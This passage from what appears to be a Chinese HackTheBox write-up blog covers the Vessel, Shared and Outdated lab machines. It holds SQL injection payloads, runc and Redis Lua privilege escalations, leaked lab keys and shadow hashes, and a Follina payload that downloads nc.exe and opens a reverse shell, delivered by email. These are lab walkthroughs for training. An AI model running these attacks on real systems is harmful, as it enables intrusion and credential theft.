aZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC&#x2F;4Sj0v3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWeN4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- siteisup_test.py12345678910www-data@updown:/home/developer/dev$ cat siteisup_test.pycat siteisup_test.pyimport requestsurl = input(\"Enter URL here:\")page = requests.get(url)if page.status_code == 200: print \"Website is up\"else: print \"Website is down\" user flag得到的私钥ssh登录： 提权信息这部分很简单，基础的gtfobins： easy_install | GTFOBinshttps://gtfobins.github.io/gtfobins/easy_install/#sudo 提权 &amp; root flag123TF=$(mktemp -d)echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')\" &gt; $TF/setup.pysudo /usr/local/bin/easy_install $TF shadow12root:$6$35UwqDmGM31K3z1O$EV0yHaLbvEqQ1YfxHOl4fMFHnR0O0Lo7RSnFGpYdfUwBmec0&#x2F;5JWenL6GLivYgeka8Z4XyYW2UhWOV5UOdK0w.:19165:0:99999:7:::developer:$6$LkPh3nNMEVO.zmIc$I&#x2F;j67KSo1n7pR.fzcMfH&#x2F;hc&#x2F;8EYISX8JUtDpoc7iMIiYEhX4bgVXPV4L6Gam3AvxMd46wh5XTulsxbpy9ezLf&#x2F;:19165:0:99999:7::: 参考资料 PHP: proc_open - Manualhttps://www.php.net/manual/en/function.proc-open.php easy_install | GTFOBinshttps://gtfobins.github.io/gtfobins/easy_install/#sudo UpDown - HTB [Discussion] | BreachForumshttps://breached.to/Thread-UpDown-HTB-Discussion HackTheBox (HTB) Writeup: UpDown [Medium] – meowmeowattackhttps://meowmeowattack.wordpress.com/2022/09/05/hackthebox-htb-writeup-updown-medium/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Vessel - HackTheBox","slug":"Vessel-HackTheBox","date":"2022-09-06T06:25:20.000Z","updated":"2023-03-27T00:46:42.833Z","comments":true,"path":"2022/09/06/Vessel-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/09/06/Vessel-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/492 10.10.11.178 端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV -Pn 10.10.11.178Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 21:37 CSTNmap scan report for 10.10.11.178Host is up (0.32s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA)| 256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA)|_ 256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-trane-info: Problem with XML parsing of /evox/about|_http-title: VesselService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 110.36 seconds 80根据请求响应信息知道是Nodejs Express： 目录扫描目录扫描发现dev，继续扫描发现git泄漏： 123456789101112gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://10.10.11.178/ --wildcard --exclude-length 26/admin (Status: 302) [Size: 28] [--&gt; /login]/css (Status: 301) [Size: 173] [--&gt; /css/]/dev (Status: 301) [Size: 173] [--&gt; /dev/]/img (Status: 301) [Size: 173] [--&gt; /img/]/js (Status: 301) [Size: 171] [--&gt; /js/]/logout (Status: 302) [Size: 28] [--&gt; /login]gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://10.10.11.178/dev/ --wildcard --exclude-length 26/.git/HEAD (Status: 200) [Size: 23] dev git泄漏dump源码分析 1git-dumper http://10.10.11.178/dev/.git/ git_dump 根据log，发现security fix以及作者相关信息： security fix查看代码，发现login修复了sql 注入： 这段代码看起来很安全，但是，典型案例： Node.js SQL Injection Guide: Examples and Preventionhttps://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/ 攻击者可以传入对象而不是字符串，从而绕过认证 config/db.jsconfig里得到数据库密码： 1234567var connection = &#123; db: &#123; host : 'localhost', user : 'default', password : 'daqvACHKvRn84VdVp', database : 'vessel'&#125;&#125;; admin使用文章中的payload绕过登录，进入管理后台： 1username&#x3D;admin&amp;password[password]&#x3D;1 分析功能发现新的子域名： openwebanalytics.vessel.htb 新的子域名加入hosts后访问, 需要认证： 110.10.11.178 vessel.htb openwebanalytics.vessel.htb 搜索可以找到相关漏洞： From Single / Double Quote Confusion To RCE (CVE-2022-24637) – devel0pment.dehttps://devel0pment.de/?p=2494 CVE-2022-24637123$cache_file = $this-&gt;makeCollectionDirPath($collection).$id.'.php';http://openwebanalytics.vessel.htb/owa-data/caches/1/ 缓存文件是使用用户的 id 生成的，格式如下：md5(id1) 因此，对于 id 为 1 的用户，缓存名称为：fafe1b60c24107ccd8f4562213e44849 使用 http://openwebanalytics.vessel.htb/index.php?owa_do=base.passwordResetForm ，我们可以找出一个有效的电子邮件，admin@vessel.htb 我假设这个用户的 id 为 1，最后证明是真的。 我们可以尝试使用这个账号登录，即使登录失败也会在 http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_configuration/ 下生成缓存文件，但是这个缓存不包含任何用户敏感信息。所以我们需要找到其他对应的动作来生成另一个缓存。 通过一些谷歌搜索，我发现其他人的网站运行 owa 并揭示了缓存文件的命名方式。然后我搜索的方式是使用谷歌搜索运算符： 后来，我发现通过请求为用户重置密码，会在 http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php admin@vessel.htb处生成缓存，这可以观察到，因为当缓存文件在那里，路径 http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/ 将显示一个空白页面而不是目录列表视图。 检查文件内容： 简单的步骤就是： 去重置 admin@vessel.htb 账号密码 对应文件得到缓存信息 123456curl http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php admin@vessel.htb$2y$10$B1xWod4b9nkPdUFqaaL5LOZJd5Mb/50AmVMTvK5rhDImdh1XWn2U6temp_passkey : 7e0db1883aff3f509809dc788118d136api_key : a390cc0247ecada9a2b8d2338b9ca6d2 得到的hash破解不出来，但有一个temp_passkey，可以用于重置密码： 1http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersChangePassword 检查表单以检查用于此请求的密钥名称（隐藏在表单中）owa_k 删除隐藏属性，将 temp_passkey 粘贴到字段中，然后更改密码 现在，您应该可以admin使用新设置的密码登录帐户了 shell可以根据文章手工，也可以直接脚本打到www-data shell: Lay0us1/CVE-2022-24637: Unauthenticated RCE in Open Web Analytics (OWA) 1.7.3https://github.com/Lay0us1/CVE-2022-24637 passwordGenerator/home/steven目录下有几个文件，下载下来分析： 123/home/steven/passwordGenerator/home/steven/.notes/screenshot.png/home/steven/.notes/notes.pdf 网络问题，passwordGenerator是个exe太大了下载不下来，这部分根据wp云了： passwordGenerator是pyinstaller编译的exe，反编译 https://github.com/extremecoders-re/pyinstxtractor 反编译，阅读代码，似乎有32^128 个密码组合 但是使用QT 如何实现随机数生成器，idx 将只是有限数量的值 1234qsrand(QTime.currentTime().msec())password = ''for i in range(length): idx = qrand() % len(charset) 复制genPassword代码并修改它以使其工作。 然后创建一个while循环来生成密码，这个过程在大约1000个密码时会变得非常慢。 使用生成的密码破解pdf，得到pdf密码 123pdfcrack -f notes.pdf -w ~/share/passwordGenerator_extracted/pass.txtfound user-password: 'YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS' 打开pdf，得到ethan用户密码： 123456Dear Steven,As we discussed since I&#39;m going on vacation you will be in charge of system maintenance. Pleaseensure that the system is fully patched and up to date.Here is my password: b@mPRNSVTjjLKId1TSystem AdministratorEthan genPassword.py1234567891011121314151617181920212223242526272829303132333435363738394041424344from PySide2.QtCore import *def genPassword(): length = 32 char = 0 if char == 0: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+=&#123;&#125;[]|:;&lt;&gt;,.?' else: if char == 1: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' else: if char == 2: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890' else: pass try: qsrand(QTime.currentTime().msec()) password = '' for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: print('error') return passworddef gen_possible_passes(): passes = [] try: while True: ps = genPassword() if ps not in passes: passes.append(ps) # print(ps) print(len(passes)) except KeyboardInterrupt: with open('pass.txt', 'w') as ofile: for p in passes: ofile.write(p + '\\n')gen_possible_passes() user flagethan用户ssh登录，得到user flag： 12ssh ethan@10.10.11.178b@mPRNSVTjjLKId1T 提权信息运行linpeas，发现runc,搜索能发现一个相关漏洞： RunC Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation cr8escape: New Vulnerability in CRI-O Container Engine (CVE-2022-0811)https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/ 提权 &amp; root flag 严格按照步骤操作，这是一个令人困惑的漏洞利用 请注意，此漏洞利用不涉及 kubectl、minikube、docker 等。您需要了解 cve-2022-0811 的概念并使用底层命令进行复制 两个ssh session： Session1: 12345678910111213141516171819mkdir /tmp/miao &amp;&amp; cd /tmp/miaorunc spec --rootlessmkdir rootfsnano config.json# 在mount section里面添加内容：&#123; \"type\": \"bind\", \"source\": \"/\", \"destination\": \"/\", \"options\": [ \"rbind\", \"rw\", \"rprivate\" ]&#125;,# 运行，得到只读root：runc --root /tmp/miao run alpine Session2: 1echo -e '#!/bin/sh\\nchmod +s /usr/bin/bash' &gt; /tmp/miao/e.sh &amp;&amp; chmod +x /tmp/miao/e.sh 然后回到session1,确认文件已创建: 1# ls -al /tmp/miao 在session 2中，使用 pinns 为 kernel.core_pattern 分配一个值，以便在核心转储时，它将执行恶意脚本 1pinns -d /var/run -f 844aa3c8-2c60-4245-a7df-9e26768ff303 -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/miao/e.sh #' --ipc --net --uts --cgroup 在session 1，触发核心转储 12345678910111213141516# ulimit -c unlimited# tail -f /dev/null &amp;# ps PID TTY TIME CMD 1 pts/0 00:00:00 sh 11 pts/0 00:00:00 tail 12 pts/0 00:00:00 ps# bash -ibash: /root/.bashrc: Permission deniedroot@runc:/# kill -SIGSEGV 11root@runc:/# ps PID TTY TIME CMD 1 pts/0 00:00:00 sh 13 pts/0 00:00:00 bash 15 pts/0 00:00:00 psroot@runc:/# session 2中，检查该s位是否已分配给usr/bin/bash，然后提升为有效root： shadow123root:$6$9AU197eAAajcv6DO$YOGX5f111bLxtIqVgPKGg3QmWiWIRVmYk3Gkj0BwFVb9K0BkAnJEHaRJElahiQGxtDnvjPI9XqPMkI7YrE60A1:19101:0:99999:7:::ethan:$6$7ZmNCkavGVnqDtRI$DXwHR.p1AXlIwDsoi20wpd57ZQL4doguuNxh4XY.vzX8wwnD8uz5Gz2AG6tWDEDfsO8CQFOYgEHg&#x2F;riNHOJ4k0:19099:0:99999:7:::steven:$6$Czg9.c1hcgYo7ON4$ogez7L7bCGFTURA4LcPv8A5CWdGufpkI4QHhSfKtZUMq2vzT7hKP&#x2F;.DSDRXSQBWzgvVTnIpY&#x2F;jG.zYFIgWFXD.:19099:0:99999:7::: 参考资料 arthaud/git-dumper: A tool to dump a git repository from a websitehttps://github.com/arthaud/git-dumper Node.js SQL Injection Guide: Examples and Preventionhttps://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/ From Single / Double Quote Confusion To RCE (CVE-2022-24637) – devel0pment.dehttps://devel0pment.de/?p=2494 Lay0us1/CVE-2022-24637: Unauthenticated RCE in Open Web Analytics (OWA) 1.7.3https://github.com/Lay0us1/CVE-2022-24637 extremecoders-re/pyinstxtractor: PyInstaller Extractorhttps://github.com/extremecoders-re/pyinstxtractor RunC Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation Vessel - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Vessel-HTB-Discussion HackTheBox (HTB) Writeup: Vessel [Hard] – meowmeowattackhttps://meowmeowattack.wordpress.com/2022/08/31/hackthebox-htb-writeup-vessel-hard/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Shared - HackTheBox","slug":"Shared-HackTheBox","date":"2022-09-04T06:22:18.000Z","updated":"2022-11-14T06:05:07.242Z","comments":true,"path":"2022/09/04/Shared-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/09/04/Shared-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/483 10.10.11.172 端口扫描22,80,443: 12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.11.172Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 13:19 CSTNmap scan report for 10.10.11.172Host is up (0.34s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)| 256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)|_ 256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)80/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to http://shared.htb|_http-server-header: nginx/1.18.0443/tcp open ssl/http nginx 1.18.0|_http-title: 400 The plain HTTP request was sent to HTTPS port| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US| Not valid before: 2022-03-20T13:37:14|_Not valid after: 2042-03-15T13:37:14| tls-nextprotoneg:| h2|_ http/1.1| tls-alpn:| h2|_ http/1.1|_ssl-date: TLS randomness does not represent time|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 133.58 seconds shared.htb 需要加hosts： 110.10.11.172 shared.htb 一个商城，测试添加后结算会到另一个子域名： checkout.shared.htb 同样加hosts后继续流程： 110.10.11.172 shared.htb checkout.shared.htb 注意到商品信息存储在cookie中： sql注入尝试修改cookie，刷新，基础的sql注入： 1&#123;&quot;&#39; and 0&#x3D;1 union select 1,2,3-- -&quot;:&quot;1&quot;&#125; 后续就是一步步获取信息 12345678910111213&#123;\"' and 0=1 union select 1,database(),3-- -\":\"1\"&#125;checkout&#123;\"' and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -\":\"1\"&#125;user&#123;\"' and 0=1 union select 1,username,2 from checkout.user-- -\":\"1\"&#125;james_mason&#123;\"' and 0=1 union select 1,password,2 from checkout.user-- -\":\"1\"&#125;fc895d4eddc2fc12f995e18c865cf273# 破解出密码Soleil101 james_mason得到的账号密码ssh登录,在developer组中： scripts_review查看developer有权限的文件，发现scripts_review目录，但里面是空的： 运行pspy64，发现uid 1001用户进入这个目录后运行ipython： ipython搜索发现相关漏洞： Execution with Unnecessary Privileges in ipython · Advisory · ipython/ipythonhttps://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x 根据资料，进入对应目录，创建恶意文件，等待执行，得到ssh私钥： 123mkdir -m 777 profile_defaultmkdir -m 777 profile_default/startupecho \"import os; os.system('cat ~/.ssh/id_rsa &gt; /tmp/key')\" &gt; profile_default/startup/foo.py dan_smith_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO+&#x2F;+OPh0&#x2F;KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZFwA4NCZouzAW1W&#x2F;ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6kusjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWxFHAVThRwfKb4Qh2l9rXGtK6G05+DXWj+OAe&#x2F;Q34gCMgFG4h3mPw7tRz2plTRBQfgLcrvVDoQtePOEc&#x2F;XuVff+kQH7PU9J1c0F&#x2F;hC7gbklm2bA8YTNlnCQ2Z2Z+HSzeEXD5rXtCA69F4Eu1FCodLROALNPgrAM4LgMbD3xaW5BqZWrm24uP&#x2F;lAAAFiPY2n2r2Np9qAAAAB3NzaC1yc2EAAAGBAL1hZMxEMPbrCJp2e2QM3n5t+K&#x2F;ueAvb248pjZeKcMTST2jUh23Vjvv&#x2F;jj4dPyoj4O9BnWhVoYJvKhHxVyxF1G50jJIgeyWwt3wnwwhlGJqfUIokAtMYhXmkm72RcAODQmaLswFtVv2V3utC2gF1QJRCG7hjlXDa1X4fl8lwxbxMq3uQVjQEUEmq1eQhl5OpLrI4m+VO73SlwEnqD0h5lsxYrJqJH2MvDsrqXfMtVlwOI3M7failIAXrVVA4motXJBQXj1peBt8qkNoIbh4QzwQvpQpd5jH9VyeyYJt7GvhLkT2RQwlIkwksQPC7LmK1gMArcSYGt9c1sRRwFU4UcHym+EIdpfa1xrSuhtOfg11o&#x2F;jgHv0N+IAjIBRuId5j8O7Uc9qZU0QUH4C3K71Q6ELXjzhHP17lX3&#x2F;pEB+z1PSdXNBf4Qu4G5JZtmwPGEzZZwkNmdmfh0s3hFw+a17QgOvReBLtRQqHS0TgCzT4KwDOC4DGw98WluQamVq5tuLj&#x2F;5QAAAAMBAAEAAAGBAK05auPU9BzHO6Vd&#x2F;tuzUci&#x2F;epwiOrhOMHSxA4y72w6NeIlg7Uev8gva5Bc41VAMZXEzyXFn8kXGvOqQoLYkYX1vKi13fG0rSYpNLH5&#x2F;SpQUaa0R52uDoIN15+bsI1NzOsdlvSTvCIUIE1GKYrK2t41lMsnkfQsvf9zPtR1TA+uLDcgGbHNEBtR7aQ41E9rDA62NTjvfifResJZre&#x2F;NFFIRyD9+C0az9nEBLRAhtTfMCE7cRkY0zDSmc6vpn7CTMXOQvdLao1WP2k&#x2F;dSpwiIOWpSLIbpPHEKBEFDbKMeJ2G9uvxXtJf3uQ14rvy+tRTog&#x2F;B3&#x2F;PgziSb6wvHri6ijt6N9PQnKURVlZbkx3yr397oVMCiTe2FA+I&#x2F;YpPtQxpmHjyClPWUsN45PwWF+D0ofLJishFH7ylAsOeDHsUVmhgOeRyywkDWFWMdz+Ke+XQYWfa9RiI5aTaWdOrytt2l3Djd1V1&#x2F;c62M1ekUoUrIuc5PS8JNlZQl7fyfMSZC9mL+iOQAAAMEAy6SuHvYofbEAD3MS4VxQ+uo7G4sU3JjAkyscViaAdEeLejvnn9i24sLWv9oE9&#x2F;UOgm2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTMwictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd&#x2F;NHUGPnNasHiPjtNCRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EYJg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ&#x2F;HI152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk&#x2F;hIlUhJNpExIs7TUKUSJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS&#x2F;9R+zEoOLUxbESENrA1qkplhN&#x2F;wPta&#x2F;wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BEwMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlWHPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQstfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- user flag使用得到的私钥登录dan_smith，得到user flag： 提权信息当前用户在sysadmin组，查找相关文件， 发现一个从redis获取信息的二进制文件，第一行输出表明了这个文件内置有密码用于登录：： redis password这个二进制文件的机制是运行时使用内置密码连接本地redis，从中获取信息，如果我们把文件下载下来在本地运行，监听6379端口，那就可以很容易的获取密码： 1F2WHqJUz2WEz&#x3D;Gqq CVE-2022-0543另外当前环境信息也符合CVE-2022-0543的条件，所以就是使用得到的密码连接，利用CVE-2022-0543执行任意命令： How To Fix CVE-2022-0543- A Critical Lua Sandbox Escape Vulnerability In Redis - The Sec Masterhttps://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/ 提权 &amp; root flag12345redis-cli --pass F2WHqJUz2WEz=Gqqeval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"cat /root/root.txt\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"cat /etc/shadow\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 shadow123root:$y$j9T$q&#x2F;qYCzzDEBdZXpRxCa6gL&#x2F;$XhNZBD56JUTsCniDDjj6UmwRnBc3A40AcbtqNzVEpJ4:19186:0:99999:7:::james_mason:$y$j9T$zJMiBXFlQaVLqD8B7hPR3.$ceN5vvW&#x2F;KTMQ.YeNjqT8UVo6TsKm&#x2F;Dl8P1uefK6v5A1:19071:0:99999:7:::dan_smith:$y$j9T$vFQT7yf8j9&#x2F;liKFLt3fr7&#x2F;$Fqyc1V0r3NrAH2JkdU6N6nEz1v5jm38wUUDbOkqZzsA:19186:0:99999:7::: 参考资料 Execution with Unnecessary Privileges in ipython · Advisory · ipython/ipythonhttps://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x How To Fix CVE-2022-0543- A Critical Lua Sandbox Escape Vulnerability In Redis - The Sec Masterhttps://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/ Shared - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Shared-HTB-Discussion--16135 Writeup Shared HackTheBoxhttps://gatogamer1155.github.io/hackthebox/shared/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Outdated - HackTheBox","slug":"Outdated-HackTheBox","date":"2022-08-29T08:09:59.000Z","updated":"2022-12-12T01:41:45.450Z","comments":true,"path":"2022/08/29/Outdated-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/08/29/Outdated-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/490 10.10.11.175 端口扫描windows域环境,没有web： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253$ nmap -sC -sV -Pn 10.10.11.175Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 13:42 CSTNmap scan report for 10.10.11.175Host is up (0.20s latency).Not shown: 988 filtered tcp ports (no-response)PORT STATE SERVICE VERSION25/tcp open smtp hMailServer smtpd| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-29 12:44:47Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-29T12:46:12+00:00; +7h00m00s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED| Not valid before: 2022-06-18T05:50:24|_Not valid after: 2024-06-18T06:00:24445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject:| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED| Not valid before: 2022-06-18T05:50:24|_Not valid after: 2024-06-18T06:00:24|_ssl-date: 2022-08-29T12:46:12+00:00; +7h00m01s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-29T12:46:12+00:00; +7h00m00s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED| Not valid before: 2022-06-18T05:50:24|_Not valid after: 2024-06-18T06:00:243269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-29T12:46:11+00:00; +7h00m00s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED| Not valid before: 2022-06-18T05:50:24|_Not valid after: 2024-06-18T06:00:24Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 3.1.1:|_ Message signing enabled and required| smb2-time:| date: 2022-08-29T12:45:31|_ start_date: N/A|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 249.36 seconds enum4linux也没什么信息 123456sudo enum4linux 10.10.11.175...Domain Name: OUTDATEDDomain Sid: S-1-5-21-4089647348-67660539-4016542185... SMBsmb可以发现一些信息： 12345678910111213141516└─$ smbclient -N -L 10.10.11.175 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share UpdateServicesPackages Disk A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system. WsusContent Disk A network share to be used by Local Publishing to place published content on this WSUS system. WSUSTemp Disk A network share used by Local Publishing from a Remote WSUS Console Instance.Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.11.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available shareshare目录里得到一个pdf： 12345678910└─$ smbclient -N //10.10.11.175/SharesTry \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Mon Jun 20 23:01:33 2022 .. D 0 Mon Jun 20 23:01:33 2022 NOC_Reminder.pdf AR 106977 Mon Jun 20 23:00:32 2022 9116415 blocks of size 4096. 1578569 blocks availablesmb: \\&gt; get NOC_Reminder.pdfgetting file \\NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (74.5 KiloBytes/sec) (average 74.5 KiloBytes/sec) NOC_Reminder.pdfpdf里给出了一个邮箱地址和一些未修复的漏洞编号，“把任何内部网络应用的链接发到itsupport@outdated.htb，这样我们就可以把它们重新添加到我们的监控平台，以便发出警报和通知”，大概是这个意思，也就是说我们发送的链接会被自动点开，然后未修复的漏洞里大大的MSDT： SMTP + follina生成恶意文件，发送邮件： JohnHammond/msdt-follina: Codebase to generate an msdt-follina payloadhttps://github.com/JohnHammond/msdt-follina 代码需要稍微改一下： 1command = f\"\"\"Invoke-WebRequest http://&lt;your-ip&gt;/nc64.exe -OutFile C:\\\\Windows\\\\Tasks\\\\nc.exe; C:\\\\Windows\\\\Tasks\\\\nc.exe -e cmd.exe &lt;your-ip&gt; &#123;args.reverse&#125;\"\"\" 然后运行，生成恶意文件，作为附件发送邮件 123456python3 follina.py -i 10.10.14.12 --port 80 --reverse 4444# 用于提供nc64.exepython3 -m http.server 7777swaks --to itsupport@outdated.htb --from miao@miao.com --server 10.10.11.175 --body \"http://10.10.14.12/\" 机器不稳定，这里可能需要多次重置，最终得到btables用户shell 